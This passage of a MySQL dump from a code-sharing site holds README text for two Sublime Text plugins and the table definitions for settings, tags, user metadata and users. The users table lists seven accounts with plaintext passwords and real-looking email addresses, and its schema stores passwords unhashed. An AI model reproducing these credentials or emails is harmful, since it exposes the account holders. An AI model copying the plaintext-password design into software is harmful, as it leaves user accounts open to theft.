	('f871e6d23e894ea2894a0de231d45cdc', 'https://secure.gravatar.com/avatar/9ef96c29b1e9b25907052a29f125c553?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'SublimeCodeIntel,代码自动完成引擎', 'sublime text', '\n\n\n\nSublimeCodeIntel是一个功能强大的代码自动完成引擎，对sublime text是个强有力的补充。这个插件是从Open Komodo Editor移植过来的，支持大部分编程语言。\n\nSublimeCodeIntel\n================\n\nCode intelligence plugin ported from `Open Komodo Editor <http://www.openkomodo.com/>`_ to `Sublime Text 2 <http://www.sublimetext.com/2>`_.\n\nSupports all the languages Komodo Editor supports for Code Intelligence (CIX, CodeIntel2):\n\n    PHP, Python, RHTML, JavaScript, Smarty, Mason, Node.js, XBL, Tcl, HTML, HTML5, TemplateToolkit, XUL, Django, Perl, Ruby, Python3.\n\nProvides the following features:\n\n* Jump to Symbol Definition - Jump to the file and line of the definition of a symbol.\n* Imports autocomplete - Shows autocomplete with the available modules/symbols in real time.\n* Function Call tooltips - Displays information in the status bar about the working function.\n\nPlugin should work in all three platforms (MacOS X, Windows and Linux).\n\n.. image:: http://pledgie.com/campaigns/16511.png?skin_name=chrome\n   :alt: Click here to lend your support to SublimeCodeIntel and make a donation at pledgie.com!\n   :target: http://pledgie.com/campaigns/16511\n\n\nInstalling\n----------\n**With the Package Control plugin:** The easiest way to install SublimeCodeIntel is through Package Control, which can be found at this site: http://wbond.net/sublime_packages/package_control\n\nOnce you install Package Control, restart ST2 and bring up the Command Palette (``Command+Shift+P`` on OS X, ``Control+Shift+P`` on Linux/Windows). Select "Package Control: Install Package", wait while Package Control fetches the latest package list, then select SublimeCodeIntel when the list appears. The advantage of using this method is that Package Control will automatically keep SublimeCodeIntel up to date with the latest version.\n\n**Without Git:** Download the latest source from `GitHub <http://github.com/Kronuz/SublimeCodeIntel>`_ and copy the whole directory into the Packages directory.\n\n**With Git:** Clone the repository in your Sublime Text 2 Packages directory, located somewhere in user\'s "Home" directory::\n\n    git clone git://github.com/Kronuz/SublimeCodeIntel.git\n\n\nThe "Packages" packages directory is located at:\n\n* OS X::\n\n    ~/Library/Application Support/Sublime Text 2/Packages/\n\n* Linux::\n\n    ~/.Sublime Text 2/Packages/\n\n* Windows::\n\n    %APPDATA%/Sublime Text 2/Packages/\n\n\nUsing\n-----\n\n* Sublime CodeIntel will allow you to jump around symbol definitions even across files with just a click. To "Jump to Symbol Declaration" use ``super+f3`` or ``alt+click`` over the symbol.\n\n* Start typing code as usual, autocomplete will pop up whenever it\'s available. To trigger manual codeintel autocompletion use ``shift+ctrl+space``.\n\nDon\'t despair! The first time you use it it needs to build some indexes and it can take more than a few seconds (around six in my configuration).\n\nIt just works!\n\n\nConfiguring\n-----------\nFor adding additional library paths (django and extra libs paths for Python or extra paths to look for .js files for JavaScript for example), either add those paths as folders to your project, or create an optional codeintel configuration file in your home or in your project\'s root.\n\nConfiguration files (``~/.codeintel/config`` or ``project_root/.codeintel/config``). All configurations are optional. Example::\n\n    {\n        "PHP": {\n            "php": \'/usr/bin/php\',\n            "phpExtraPaths": [],\n            "phpConfigFile": \'php.ini\'\n        },\n        "JavaScript": {\n            "javascriptExtraPaths": []\n        },\n        "Perl": {\n            "perl": "/usr/bin/perl",\n            "perlExtraPaths": []\n        },\n        "Ruby": {\n            "ruby": "/usr/bin/ruby",\n            "rubyExtraPaths": []\n        },\n        "Python": {\n            "python": \'/usr/bin/python\',\n            "pythonExtraPaths": []\n        },\n        "Python3": {\n            "python": \'/usr/bin/python3\',\n            "pythonExtraPaths": []\n        }\n    }\n\nAdditional settings can be configured in the User File Settings:\n\n* A list of disabled languages can be set using "codeintel_disabled_languages". Ex. ``"codeintel_disabled_languages": [\'css\']``\n\n* Live autocomplete can be disabled by setting "codeintel_live" to false.\n\n* Live autocompletion can be disabled in a per-language basis, using "codeintel_live_disabled_languages". Ex. ``"codeintel_live_disabled_languages": [\'css\']``\n\n* Information for more settings is available in the ``Base File.sublime-settings`` file.\n\n\nTroubleshooting\n---------------\n\nUsing ``build.sh``\n\n\nIf everything else fails, try rebuilding the libraries using ``build.sh``.\nYou need to install some things to make sure it\'s going to work.\nThese are likely to be packaged on your system, such as, for Ubuntu/Debian-like\ndistros. Open a terminal and do::\n\n    $ sudo apt-get install g++\n\n    $ sudo apt-get install python-dev\n\nOnce you have installed those, you may need to use the ``build.sh`` script.\nIn your terminal, go to your ``Packages/SublimeCodeIntel/src`` folder, then\nsimply run::\n\n    $ ./build.sh\n\n\nWhat\'s New\n----------\nv1.3 (20-12-2011):\n\n* This build should fix many of the problems seen in Linux systems.\n\n* Libraries for Linux rebuilt with libpcre statically (libpcre bundled for Linux builds).\n\n* ``calltip()`` is now thread safe (which caused some strange behavior in Linux where Sublime Text 2 ended up being unresponsive).\n\n\nv1.2 (18-12-2011):\n\n* JavaScript support improved (it\'s now much nicer with the CPU).\n\n* CSS files support much improved (thanks to Jon\'s new features in autocomplete).\n\n* Added palette commands to disable/enable the plugin in many ways.\n\n* Added ``codeintel_live_disabled_languages`` and fixed ``codeintel_live`` to disable SublimeCodeIntel live autocomplete mode.\n\n* Smarter language detection and fallbacks.\n\n* Improved autocomplete triggering, should now respond better.\n\n* Support for new completion settings in Sublime Text 2 Build 2148.\n\n\nLicense\n-------\nThe plugin is based in code from the Open Komodo Editor and has a MPL license.\n\nPorted from Open Komodo by German M. Bravo (Kronuz).\n\n', ' Kronuz ', 'MPL', 'https://github.com/Kronuz/SublimeCodeIntel', NULL, NULL, 7, 4, 'python', 0, '2012-07-22 20:17:42'),
	('f9c103c02324427984c0c28905720a76', 'https://secure.gravatar.com/avatar/12365c1b9b6f745c574c01c39eb9653c?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', ' ZenCoding for Sublime text 2 快速编写HTML/CSS代码的插件', 'sublime text', '\n\n## Installation\n\nMac OSX (Lion)\n\nClone git repo into your packages folder (mine is ~/Library/Application Support/Sublime Text 2/Packages):\n\n    $ cd ~/Library/Application Support/Sublime Text 2/Packages \n    $ git clone https://github.com/sublimator/ZenCoding.git\n\nRestart Sublime Text 2\n\n## 参考文章 \n1. [Zen Coding: 一种快速编写HTML/CSS代码的方法](http://www.qianduan.net/zen-coding-a-new-way-to-write-html-code.html)\n2. [Zen Coding在线编辑器中文版](http://labs.qianduan.net/zencoding/)\n\n', 'sublimator ', 'BSD', 'https://github.com/sublimator/ZenCoding', NULL, NULL, 9, 4, 'python', 0, '2012-07-22 18:30:39');
/*!40000 ALTER TABLE `projects` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.settings
DROP TABLE IF EXISTS `settings`;
CREATE TABLE IF NOT EXISTS `settings` (
  `key` varchar(255) NOT NULL,
  `value` text,
  `desc` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.settings: ~0 rows (approximately)
DELETE FROM `settings`;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.tags
DROP TABLE IF EXISTS `tags`;
CREATE TABLE IF NOT EXISTS `tags` (
  `id` varchar(32) NOT NULL,
  `name` varchar(64) NOT NULL,
  `desc` text NOT NULL,
  `hits` int(10) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.tags: ~0 rows (approximately)
DELETE FROM `tags`;
/*!40000 ALTER TABLE `tags` DISABLE KEYS */;
/*!40000 ALTER TABLE `tags` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.usermeta
DROP TABLE IF EXISTS `usermeta`;
CREATE TABLE IF NOT EXISTS `usermeta` (
  `id` varchar(32) NOT NULL,
  `userid` varchar(32) NOT NULL,
  `key` varchar(255) NOT NULL,
  `value` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.usermeta: ~0 rows (approximately)
DELETE FROM `usermeta`;
/*!40000 ALTER TABLE `usermeta` DISABLE KEYS */;
/*!40000 ALTER TABLE `usermeta` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.users
DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` varchar(32) NOT NULL,
  `username` varchar(64) NOT NULL,
  `password` varchar(64) NOT NULL,
  `nicename` varchar(64) DEFAULT NULL,
  `email` varchar(128) DEFAULT NULL,
  `url` varchar(128) DEFAULT NULL,
  `created` varchar(19) NOT NULL,
  `lastlogin` varchar(19) NOT NULL,
  `status` int(2) NOT NULL DEFAULT '0',
  `authkey` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.users: ~7 rows (approximately)
DELETE FROM `users`;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` (`id`, `username`, `password`, `nicename`, `email`, `url`, `created`, `lastlogin`, `status`, `authkey`) VALUES
	('0640c5ddfb484182921498ab58430042', 'demo', 'demo123', 'demo', 'demo@qq.com', NULL, '2012-07-11 18:38:46', '2012-07-11 18:38:46', 0, '0640c5ddfb484182921498ab58430042'),
	('4e84ce1b8a5247bb8a6179959438b55f', 'piaoren', 'pyer@123', '飘人', 'jamiesun@talkincode.org', NULL, '2012-07-12 00:03:37', '2012-07-22 18:27:42', 0, '4e84ce1b8a5247bb8a6179959438b55f'),
	('77151804ad17409383dd322156a77362', 'jimi', 'jimi@123', 'jimi', 'jimi@talkincode.org', NULL, '2012-07-22 12:33:46', '2012-07-22 12:33:46', 0, '77151804ad17409383dd322156a77362'),
	('c93892ebe02e4ea1a5b06cab6d1e87ab', 'pren', 'pren@123', 'pren', '6583805@qq.com', NULL, '2012-07-11 18:40:02', '2012-07-13 16:43:24', 0, 'c93892ebe02e4ea1a5b06cab6d1e87ab'),
	('cbf4b961d8c0447593bc4083cbc74e85', 'hamain', '123456', 'hamain', 'hami@talkincode.org', NULL, '2012-07-22 15:18:54', '2012-07-22 15:18:54', 0, 'cbf4b961d8c0447593bc4083cbc74e85'),
	('d07d60af92a14169afc444f5d5aeb45a', 'jamiesun', 'wjt@123', 'jamiesun', 'jamiesun.net@gmail.com', NULL, '2012-07-11 00:09:01', '2012-07-14 02:47:22', 0, 'd07d60af92a14169afc444f5d5aeb45a'),
	('d76231230bc04f57859e1745eb898ca1', 'orange', 'orange', 'orange', 'iyangsg@gmail.com', NULL, '2012-07-16 20:27:03', '2012-07-16 20:27:03', 0, 'd76231230bc04f57859e1745eb898ca1');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
